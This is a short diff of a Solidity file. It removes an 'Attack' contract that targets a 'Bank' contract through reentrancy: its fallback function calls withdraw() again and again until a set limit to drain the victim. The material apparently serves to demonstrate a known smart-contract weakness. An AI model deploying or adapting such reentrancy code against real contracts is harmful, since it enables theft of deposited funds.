@@ -44,30 +44,3 @@ contract Bank {
 
 }
 
-contract Attack {
-    Bank b;
-    uint public count;
-    uint public limit;
-
-    function setVictimAddress(address victim) payable {
-        b = Bank(victim);
-    }
-
-    function setLimit(uint _limit) external {
-        limit = _limit;
-    }
-
-    function stake() public payable {
-        b.stake.value(msg.value)();
-    }
-
-    function attack() {
-        b.withdraw();
-    }
-
-    function() payable {
-        count++;
-        if(count < limit) b.withdraw();
-    }
-
-}
